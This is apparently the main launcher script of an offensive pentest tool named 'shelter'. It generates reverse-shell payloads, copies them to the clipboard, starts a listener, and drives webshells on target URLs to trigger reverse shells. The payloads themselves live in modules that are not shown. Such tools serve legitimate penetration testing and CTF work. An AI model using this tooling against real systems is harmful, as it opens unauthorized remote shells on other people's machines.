#!/usr/bin/python3

from shelter.helpers.cli import generate_cli_args
from shelter.modules.shell_copy import shell_cpy
from shelter.modules.web import *
from shelter.helpers.shell_handler import shell_handler
from shelter.helpers.stylize import *
from shelter.helpers.cli import *

import pyperclip
import threading
import pdb


# Inserting arguments to the program.
# Returns the arguments entered to the args variable.
def main():
    args = generate_cli_args()

    if args.module == "rev" :
        payload = shell_cpy(args.lang,args.i,args.p)
        pyperclip.copy(payload[0])
        ap(f"Copied reverseshell payload {payload[0]}")
        shell_handler(int(payload[2]),nohandler=args.nohandler)
    elif args.module == "web" :
        url = Invoke_Weburl_prepare(args.url,ssl=args.ssl,nossl=args.nossl,param=args.param,file=args.f)
        Invoke_Webshell(url)
    elif args.module == "webrev" : 
        url = Invoke_Weburl_prepare(args.url,ssl=args.ssl,nossl=args.nossl,param=args.param,file=args.f)
        payload = shell_cpy(args.lang,args.i,args.p)
        threading.Timer(1,Invoke_Revshell,[url,payload[0]]).start()
        shell_handler(int(payload[2]),nohandler=args.nohandler)
if __name__ == '__main__':
    main()
